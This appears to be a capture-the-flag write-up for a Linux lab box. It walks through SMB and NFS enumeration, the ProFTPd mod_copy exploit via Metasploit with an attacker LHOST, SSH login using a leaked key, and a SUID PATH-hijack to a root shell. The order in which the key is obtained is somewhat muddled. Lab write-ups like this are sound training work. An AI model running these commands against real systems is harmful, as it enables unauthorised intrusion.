@@ -1,0 +1,90 @@
+OS: Linux
+Date: 08.10.2026
+
+1. Reconnaissance
+
+Nmap scan:
+
+nmap -sV -sC -p- <IP>
+
+Open ports:
+
+21   (FTP)   — ProFTPd 1.3.5
+22   (SSH)   — OpenSSH
+139  (SMB)
+445  (SMB)
+2049 (NFS)
+111  (RPCbind)
+80   (HTTP)
+2. Enumeration
+
+SMB shares:
+
+smbclient -L //<IP>/
+smbclient //<IP>/anonymous
+
+Anonymous share accessible — found a file log.txt referencing an SSH private key path on the box.
+
+NFS shares:
+
+showmount -e <IP>
+
+Shows an exported share (typically /var), mounted locally:
+
+mkdir /mnt/kenobiNFS
+mount -t nfs <IP>:/var /mnt/kenobiNFS
+
+Inside, found the /var/tmp contents including a hidden SSH key directory belonging to user kenobi (.ssh/id_rsa).
+
+ProFTPd 1.3.5 — known to be vulnerable to:
+
+CVE-2015-3306 — mod_copy exploit (arbitrary file copy without auth)
+3. Exploitation
+
+Used the ProFTPd mod_copy vulnerability via Metasploit (or raw FTP SITE CPFR/CPTO commands) to copy the private SSH key found via NFS into the web root, or directly leveraged the NFS-exposed key:
+
+msfconsole
+use exploit/unix/ftp/proftpd_modcopy_exec
+set RHOSTS <IP>
+set SITEPATH /var/www/html
+set LHOST <attacker IP>
+run
+
+Alternatively, copied kenobi’s private key out via the mod_copy primitive, set permissions, and logged in directly:
+
+chmod 600 id_rsa
+ssh -i id_rsa kenobi@<IP>
+4. Privilege Escalation
+
+Checked SUID binaries:
+
+find / -perm -4000 -type f 2>/dev/null
+
+Found a non-standard SUID binary: /usr/bin/menu — a custom script/binary that calls other commands (e.g. curl, uname, ifconfig) without specifying full paths, making it vulnerable to PATH hijacking.
+
+Exploit:
+
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+# select the option that calls "curl"
+
+This spawns a root shell via the hijacked curl in the manipulated $PATH.
+
+5. Flags
+
+User flag:
+
+cat /home/kenobi/user.txt
+
+Root flag:
+
+cat /root/root.txt
+6. Lessons Learned
+NFS misconfiguration can leak sensitive files (like SSH keys) directly — always check showmount -e.
+ProFTPd 1.3.5’s mod_copy (CVE-2015-3306) allows unauthenticated file copy — a serious vuln for an old FTP daemon.
+Combining two low-severity issues (NFS leak + FTP copy primitive) gave full user access.
+SUID binaries calling other commands without full paths are a classic PATH-hijacking privesc vector.
+Always enumerate find / -perm -4000 for unusual custom SUID binaries, not just standard ones.
